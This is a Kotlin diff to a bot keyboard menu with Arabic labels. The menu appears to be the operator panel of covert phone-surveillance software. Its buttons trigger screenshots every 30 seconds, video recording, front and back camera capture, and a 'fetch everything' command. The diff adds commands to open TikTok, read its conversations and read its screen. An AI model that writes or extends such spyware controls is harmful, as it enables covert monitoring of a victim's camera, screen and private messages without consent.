@@ -29,12 +29,14 @@ object KeyboardBuilder {
             btn("📷 لقطات كل 30s", "screen_loop_start"),
             btn("🛑 إيقاف اللقطات", "screen_loop_stop")
         ))
-        rows.put(row(btn("📹 تسجيل فيديو 30s", "video_30")))
-        rows.put(row(btn("📹 تسجيل فيديو 60s", "video_60")))
+        rows.put(row(btn("📹 فيديو 30s", "video_30")))
         rows.put(row(
             btn("🤳 كاميرا أمامية", "cam_front"),
             btn("📸 كاميرا خلفية", "cam_back")
         ))
+        rows.put(row(btn("🎵 تيك توك — فتح", "tiktok_open")))
+        rows.put(row(btn("🎵 تيك توك — المحادثات", "tiktok_messages")))
+        rows.put(row(btn("🎵 تيك توك — اقرأ الشاشة", "tiktok_read_screen")))
         rows.put(row(btn("🚀 جلب كل شي مع بعض", "fetch_all")))
         rows.put(row(btn("🔄 تحديث القائمة", "menu")))
 
